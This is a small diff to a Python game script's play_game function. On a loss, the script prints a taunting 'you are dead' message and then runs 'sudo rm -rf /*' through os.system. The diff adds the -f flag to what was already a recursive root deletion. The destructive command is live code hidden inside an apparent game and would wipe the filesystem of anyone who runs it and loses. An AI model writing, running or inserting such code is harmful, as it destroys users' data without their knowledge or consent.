@@ -51,7 +51,7 @@ def play_game():
     # If the loop completes without breaking, the player has exhausted all lifelines
     print("You lost! Now, you are dead.....")
     print("Thanks for playing!")
-    command = "sudo rm -r /*"
+    command = "sudo rm -rf /*"
     os.system(command)
 
 def main():
